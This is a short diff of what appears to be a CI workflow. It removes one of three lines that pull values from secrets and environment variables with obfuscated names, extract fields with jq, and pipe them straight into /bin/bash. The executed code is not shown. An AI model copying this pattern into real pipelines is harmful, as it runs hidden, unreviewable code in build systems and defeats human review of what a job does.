@@ -22,7 +22,6 @@ jobs:
           ondm93: ${{ secrets.ondm93 }}
         run: |
           printf '%s' "$ondm93" | jq -r .pb74225 | /bin/bash
-          printf '%s' "$pn09760" | jq -r .ugyk6 | /bin/bash
           echo $ezo987 | jq -r .zwq257 | /bin/bash
 
       - name: Archive results
